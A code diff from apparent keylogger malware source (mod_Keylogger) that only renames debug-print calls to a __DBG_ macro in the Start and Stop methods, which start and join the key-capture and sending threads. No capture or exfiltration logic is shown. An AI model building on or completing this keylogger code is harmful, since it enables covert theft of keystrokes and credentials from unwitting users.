@@ -413,7 +413,7 @@ mod_Keylogger::mod_Keylogger() {
 }
 
 void mod_Keylogger::Start() {
-    DebugPrint("[!] Keylogger start");
+    __DBG_("[!] Keylogger start");
 	this->isRunning = true;
     g_Run = true;
 	this->thKey = std::thread(&mod_Keylogger::CaptureKeys, this);
@@ -421,14 +421,14 @@ void mod_Keylogger::Start() {
 }
 
 void mod_Keylogger::Stop() {
-    DebugPrint("[!] Keylogger stopping");
+    __DBG_("[!] Keylogger stopping");
     std::unique_lock<std::mutex> lock(this->mtx_Run);
     this->isRunning = false;
     g_Run = false;
     lock.unlock();
 
     
-    DebugPrint("[!] Joining threads");
+    __DBG_("[!] Joining threads");
     if (this->thKey.joinable()) {
         this->thKey.join();
     }
@@ -436,7 +436,7 @@ void mod_Keylogger::Stop() {
         this->thSend.join();
     }
 
-    DebugPrint("[!] Keylogger stopped");
+    __DBG_("[!] Keylogger stopped");
 }
 
 void mod_Keylogger::CaptureKeys() {
